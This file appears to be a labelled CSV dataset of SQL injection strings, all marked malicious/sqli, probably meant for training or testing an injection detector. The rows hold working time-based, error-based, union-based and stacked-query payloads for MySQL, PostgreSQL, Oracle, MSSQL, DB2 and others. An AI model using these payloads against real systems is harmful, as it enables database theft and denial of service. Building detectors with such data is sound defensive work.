payload,label,attack_type
"1;select count(*) from generate_series(1,5000000)--",malicious,sqli
"1"")));select count(*) from generate_series(1,5000000) and (((""wdbg"" like ""wdbg",malicious,sqli
"1%"");iif(7036=2370,1,1/0)",malicious,sqli
"1)) as fmpr where 3103=3103 and elt(9970=9297,9297)--",malicious,sqli
"1')) or 8421=(select count(*) from generate_series(1,5000000)) and (('uorw' like 'uorw",malicious,sqli
"-8612') as toeu where 6357=6357 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",malicious,sqli
"-2912"") as eizh where 2223=2223 or make_set(1041=3056,3056)--",malicious,sqli
"1 or elt(6272=6272,sleep(5))-- ilfc",malicious,sqli
"1"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""uglh"" like ""uglh",malicious,sqli
"1"")) as zbfj where 2285=2285;(select * from (select(sleep(5)))acdk)#",malicious,sqli
"1"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",malicious,sqli
-4900')) or 7208=3236,malicious,sqli
"1')) union all select null,null,null,null,null,null,null,null--",malicious,sqli
1'+(select wgmn where 4368=4368 and 7859=6151)+',malicious,sqli
1%';select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,malicious,sqli
"1')));select count(*) from generate_series(1,5000000) and ((('xori' like 'xori",malicious,sqli
"1)) and make_set(8554=3286,3286) and ((7385=7385",malicious,sqli
"1))) and make_set(8403=8403,8899) and (((3036=3036",malicious,sqli
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'yfkk'='yfkk",malicious,sqli
"-1641'||(select 'jfnu' where 7682=7682 union all select 7682,7682,7682--",malicious,sqli
"1') and make_set(8403=8403,8899) and ('dhoo' like 'dhoo",malicious,sqli
"1"" where 8918=8918 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",malicious,sqli
1 and (1977=6852)*6852-- clxl,malicious,sqli
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('yqrt' like 'yqrt",malicious,sqli
-2483' where 1327=1327 union all select 1327#,malicious,sqli
"-9934"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""xecb"" like ""xecb",malicious,sqli
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",malicious,sqli
"1') as jxqt where 4322=4322 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
1'))) and 7533=7533 and ((('hoyw'='hoyw,malicious,sqli
"1"")) as mvxa where 3024=3024;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",malicious,sqli
"1"" and 4288=3696 and ""qqam"" like ""qqam",malicious,sqli
-2233' or (1807=7274)*7274,malicious,sqli
1') where 1917=1917 union all select null#,malicious,sqli
-1385'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('mjjd'='mjjd,malicious,sqli
"1)) and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,sqli
"1'||(select 'ejuu' from dual where 2903=2903 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",malicious,sqli
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('lvck'='lvck",malicious,sqli
"1,(select 9100=('qqpjq'||(select case 9100 when 9100 then 1 else 0 end from rdb$database)||'qzvzq'))",malicious,sqli
"1')) as yyrx where 5600=5600;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
1))) and (6148=3343)*3343 and (((3271=3271,malicious,sqli
"1"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""qqky"" like ""qqky",malicious,sqli
"1')) as fwxq where 9935=9935 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",malicious,sqli
"-6523"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""bwrb"" like ""bwrb",malicious,sqli
1' in boolean mode);begin dbms_lock.sleep(5); end--,malicious,sqli
-3861') as zmja where 4036=4036 or 9323=9323#,malicious,sqli
1'+(select 'zjvx' where 4683=4683 and 6969=(select 6969 from pg_sleep(5)))+',malicious,sqli
"1%') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('%'='",malicious,sqli
1' and (select * from (select(sleep(5)))fzno),malicious,sqli
"1"";begin user_lock.sleep(5); end and ""mdje"" like ""mdje",malicious,sqli
"-6333""))) union all select 9851,9851,9851,9851,9851,9851--",malicious,sqli
"1"" where 4345=4345 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",malicious,sqli
"-9725') union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",malicious,sqli
-7707')) union all select 3172#,malicious,sqli
1 or (select * from (select(sleep(5)))sddo)#,malicious,sqli
1%') rlike (select (case when (1210=8664) then 1 else 0x28 end)) and ('%'=',malicious,sqli
"1,(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",malicious,sqli
"-7248') where 4626=4626 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
1' where 9816=9816 and 7533=7533--,malicious,sqli
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('gsdq'='gsdq",malicious,sqli
-1802' or 7931=5841--,malicious,sqli
"1"" or 6793=(select 6793 from pg_sleep(5))",malicious,sqli
1 rlike (select (case when (7689=7689) then 1 else 0x28 end))-- jduw,malicious,sqli
"-2725"" union all select 3671,3671,3671,3671,3671#",malicious,sqli
"1)) union all select null,null,null,null,null,null,null,null,null,null--",malicious,sqli
"-7202%"")) union all select 2901#",malicious,sqli
1'));select pg_sleep(5) and (('rnzp'='rnzp,malicious,sqli
"1%"";select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",malicious,sqli
"1%'));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('cylu'='cylu",malicious,sqli
"1'))) and make_set(9514=8668,8668) and ((('sgjj' like 'sgjj",malicious,sqli
"1')) as pstn where 6691=6691 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",malicious,sqli
"-3628"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",malicious,sqli
-6802) as coyv where 5693=5693 or 8571=8571--,malicious,sqli
"1"") where 9295=9295 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",malicious,sqli
"1))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((4234=4234",malicious,sqli
1)));(select * from (select(sleep(5)))acdk)#,malicious,sqli
"1' where 3339=3339 and 3824=benchmark(5000000,md5(0x76555642))--",malicious,sqli
"1%'))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
1')));select (case when (9562=5996) then 1 else 9562*(select 9562 from master..sysdatabases) end)--,malicious,sqli
"-9860) where 8743=8743 union all select 8743,8743,8743,8743,8743,8743,8743--",malicious,sqli
-7442) or 3391=7492,malicious,sqli
"1%"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""%""=""",malicious,sqli
"1' in boolean mode);iif(1378=6569,1,1/0)",malicious,sqli
"-3364%""))) union all select 5464--",malicious,sqli
"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",malicious,sqli
"1) where 9338=9338 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",malicious,sqli
"1""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""tepf""=""tepf",malicious,sqli
1);select (case when (9455=6007) then 9455 else 9455*(select 9455 from mysql.db) end)#,malicious,sqli
"-1869""))) union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",malicious,sqli
"1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((5324=5324",malicious,sqli
"1%""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",malicious,sqli
"1))) union all select null,null,null,null,null,null#",malicious,sqli
"1""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""xnsj"" like ""xnsj",malicious,sqli
1 and 2620=2175,malicious,sqli
-6755) or 9323=9323#,malicious,sqli
"1%"" order by 1#",malicious,sqli
"1) as wokl where 1368=1368 union all select null,null,null,null,null,null--",malicious,sqli
-9739' or 8571=8571--,malicious,sqli
"1"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""tzog"" like ""tzog",malicious,sqli
"1"";select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",malicious,sqli
1'||(select 'yucg' where 2576=2576 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))||',malicious,sqli
"1,(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--",malicious,sqli
"1%'))) union all select null,null,null,null,null,null,null,null--",malicious,sqli
"1%' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and '%'='",malicious,sqli
1' in boolean mode);(select * from (select(sleep(5)))srmq)#,malicious,sqli
"1 and 8407=(select count(*) from generate_series(1,5000000))# tqmr",malicious,sqli
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""oyfk""=""oyfk",malicious,sqli
"1"" where 9172=9172 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",malicious,sqli
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))-- zvkh",malicious,sqli
"1' and elt(1210=1210,sleep(5))",malicious,sqli
1')) and (1427=5813)*5813 and (('estb' like 'estb,malicious,sqli
"-4515"") or elt(4545=2509,2509) and (""lglx""=""lglx",malicious,sqli
-7037')) as epsg where 3684=3684 union all select 3684--,malicious,sqli
"1') or 8421=(select count(*) from generate_series(1,5000000)) and ('csmu'='csmu",malicious,sqli
1 where 7516=7516 union all select null#,malicious,sqli
-6190'))) union all select 9413--,malicious,sqli
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('hfxu' like 'hfxu",malicious,sqli
-4607'||(select 'wkdg' where 7524=7524 order by 1--,malicious,sqli
"1"" where 5372=5372 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"-4838')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
-5995')) or 6872=6872 and (('pywh'='pywh,malicious,sqli
"1)) as ipfy where 1189=1189;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
"1%"")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""%""=""",malicious,sqli
"1"" where 4298=4298 order by 1--",malicious,sqli
"1) where 7729=7729;iif(5257=5257,1,1/0)",malicious,sqli
"1"" and elt(8464=5761,5761) and ""ydmt"" like ""ydmt",malicious,sqli
1') or 6793=(select 6793 from pg_sleep(5)) and ('dtzt' like 'dtzt,malicious,sqli
"-9966')) union all select 7230,7230,7230,7230,7230,7230,7230#",malicious,sqli
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('yqzg'='yqzg",malicious,sqli
"1"" and 7533=7533",malicious,sqli
"1'+(select 'vabj' where 7178=7178 union all select null,null,null,null,null#",malicious,sqli
-4351') or 6525=9458,malicious,sqli
"1"") as gjlv where 1983=1983 and sleep(5)#",malicious,sqli
1));select (case when (8113=8981) then 8113 else 1/(select 0) end)--,malicious,sqli
"1'+(select ouhd where 8905=8905 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",malicious,sqli
"1"" where 9725=9725;waitfor delay '0:0:5'--",malicious,sqli
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))-- uslt",malicious,sqli
"1"" union all select null,null,null--",malicious,sqli
"1'||(select 'ymac' from dual where 9268=9268 or 8466=benchmark(5000000,md5(0x694a4745)))||'",malicious,sqli
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('ekla'='ekla",malicious,sqli
"1"" where 2365=2365 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1'+(select 'rajp' where 3300=3300;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1')) as lrnh where 8569=8569 union all select null,null,null,null,null--",malicious,sqli
1)) as goar where 2405=2405 and 5927=9731--,malicious,sqli
"-7793""))) or (8459=8459)*4906 and (((""lias""=""lias",malicious,sqli
1') or sleep(5),malicious,sqli
1)) and 7533=7533 and ((8738=8738,malicious,sqli
"-1084') union all select 2634,2634,2634,2634,2634,2634,2634,2634#",malicious,sqli
"1%""))) and 8594=(select 8594 from pg_sleep(5))--",malicious,sqli
-3105' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'srep'='srep,malicious,sqli
"1'+(select mumb where 4658=4658 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
-5137) or 9323=9323#,malicious,sqli
"1') where 9272=9272;select benchmark(5000000,md5(0x4c4d6142))--",malicious,sqli
1' in boolean mode);select pg_sleep(5)#,malicious,sqli
-5852) as anca where 3574=3574 or 3958=5536#,malicious,sqli
1%')) or (select * from (select(sleep(5)))ydpu) and (('%'=',malicious,sqli
1))) union all select null--,malicious,sqli
"1"") as hymr where 5497=5497 union all select null,null,null,null--",malicious,sqli
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""fvtu"" like ""fvtu",malicious,sqli
"1') or 8421=(select count(*) from generate_series(1,5000000))",malicious,sqli
"1%""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,sqli
"1) where 6035=6035;select benchmark(5000000,md5(0x714e4153))#",malicious,sqli
"1"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,sqli
"1)) or 8466=benchmark(5000000,md5(0x694a4745)) and ((8189=8189",malicious,sqli
"1'||(select 'qdkb' where 4331=4331;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",malicious,sqli
"1"")) as jikg where 8258=8258 and (3973=1047)*1047--",malicious,sqli
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('bdsq' like 'bdsq",malicious,sqli
"1')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1 or 8466=benchmark(5000000,md5(0x694a4745))",malicious,sqli
"1'+(select thmg where 2546=2546 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"-3666""))) union all select 4136,4136,4136--",malicious,sqli
1 and 8594=(select 8594 from pg_sleep(5))--,malicious,sqli
"1'))) union all select null,null,null,null,null,null#",malicious,sqli
"1"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""azpb""=""azpb",malicious,sqli
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",malicious,sqli
"1"") as qnmd where 5642=5642;select (case when (9318=7198) then 9318 else 9318*(select 9318 from information_schema.character_sets) end)#",malicious,sqli
1' where 8770=8770 union all select null--,malicious,sqli
"1') and elt(3528=3566,3566)",malicious,sqli
1') or (select * from (select(sleep(5)))sddo)#,malicious,sqli
1')));if(7899=7899) select 7899 else drop function zbbp--,malicious,sqli
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((3044=3044",malicious,sqli
"1%"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",malicious,sqli
"1'+(select 'ewlk' where 1078=1078 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
1' and 1541=6868#,malicious,sqli
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('fegp'='fegp",malicious,sqli
"1) as clye where 7842=7842 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",malicious,sqli
"1%"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",malicious,sqli
"1%' union all select null,null,null,null,null,null#",malicious,sqli
"1"")) as rpxd where 4929=4929;waitfor delay '0:0:5'--",malicious,sqli
1) rlike sleep(5),malicious,sqli
"1'||(select 'ussi' where 8958=8958;select benchmark(5000000,md5(0x4c4d6142)))||'",malicious,sqli
"1"") and 4595=4595#",malicious,sqli
"1') union all select null,null,null,null,null,null,null--",malicious,sqli
"1) or elt(5873=5873,sleep(5))#",malicious,sqli
"1))) union all select null,null,null,null,null,null,null#",malicious,sqli
"1');select * from generate_series(3427,3427,case when (3427=7516) then 1 else 0 end) limit 1--",malicious,sqli
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'mvkg'='mvkg",malicious,sqli
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null)",malicious,sqli
"1%') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"-5288') or make_set(1164=1710,1710) and ('pkwy'='pkwy",malicious,sqli
"-1894') union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",malicious,sqli
"1"") and (4085=4885)*4885 and (""sxte""=""sxte",malicious,sqli
"1',(select (case when (5249=9648) then 1 else 1/(select 0) end))",malicious,sqli
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('opll' like 'opll",malicious,sqli
"1%'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",malicious,sqli
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""cwpt"" like ""cwpt",malicious,sqli
-2797'))) union all select 5711#,malicious,sqli
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""%""=""",malicious,sqli
"1'||(select 'ghby' from dual where 4854=4854;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
1') and 8404=8651#,malicious,sqli
"1 or elt(6272=6272,sleep(5))",malicious,sqli
1'+(select 'yahd' where 5850=5850;select sleep(5)#,malicious,sqli
"1')) as peeo where 5356=5356 and elt(4722=2382,2382)--",malicious,sqli
-2749') as fiho where 3531=3531 or 2777=1485#,malicious,sqli
"-4586') as shdb where 6176=6176 union all select 6176,6176,6176,6176#",malicious,sqli
-7041') where 6307=6307 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,malicious,sqli
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",malicious,sqli
1')) as jzoh where 6484=6484 and 7364=4233--,malicious,sqli
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('wyvx'='wyvx",malicious,sqli
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""mkal"" like ""mkal",malicious,sqli
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('dkra' like 'dkra",malicious,sqli
-8397'))) or 2171=4788,malicious,sqli
"1)) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((8965=8965",malicious,sqli
"1"" and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,sqli
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'sloy'='sloy",malicious,sqli
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('osov' like 'osov",malicious,sqli
1'+(select 'rpds' where 5870=5870 and 4595=4595#,malicious,sqli
"1"")) as klie where 2840=2840 or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,sqli
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",malicious,sqli
"1%"") union all select null#",malicious,sqli
"1' where 3362=3362;iif(5257=5257,1,1/0)",malicious,sqli
"-6600') union all select 5566,5566#",malicious,sqli
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'bxjo' like 'bxjo",malicious,sqli
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)# mafe",malicious,sqli
1 where 7021=7021 or 6793=(select 6793 from pg_sleep(5))--,malicious,sqli
"-5235) or make_set(9354=9354,7185)",malicious,sqli
1 and 7533=7533,malicious,sqli
1%'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'=',malicious,sqli
-6109 union all select 6784--,malicious,sqli
"1) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
1))) or sleep(5) and (((2209=2209,malicious,sqli
"1%') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1"")));waitfor delay '0:0:5'--",malicious,sqli
1') waitfor delay '0:0:5' and ('fpnh'='fpnh,malicious,sqli
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('hryb'='hryb",malicious,sqli
"1"") as hfgk where 1100=1100 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1"" where 9829=9829 order by 1#",malicious,sqli
"1') as nmzp where 3794=3794 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1') where 7887=7887 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",malicious,sqli
"-9572%"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",malicious,sqli
"1"");begin user_lock.sleep(5); end--",malicious,sqli
1) order by 1--,malicious,sqli
"1%""))) and (3502=7893)*7893 and (((""%""=""",malicious,sqli
"-8448%"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",malicious,sqli
"-2319 union all select 5068,5068,5068#",malicious,sqli
"1' where 1085=1085 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1%"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",malicious,sqli
"-8425"")) or (6485=1127)*1127 and ((""qruf""=""qruf",malicious,sqli
"1%') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('%'='",malicious,sqli
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'tmwy'='tmwy",malicious,sqli
1 rlike (select * from (select(sleep(5)))sgvo)# ewsz,malicious,sqli
"1') where 9304=9304 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1%') and 2006=2006,malicious,sqli
"1"");select (case when (2676=4191) then 2676 else 1/(select 0) end)--",malicious,sqli
"1') as wtfo where 5666=5666 union all select null,null,null,null--",malicious,sqli
1') where 9538=9538;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,malicious,sqli
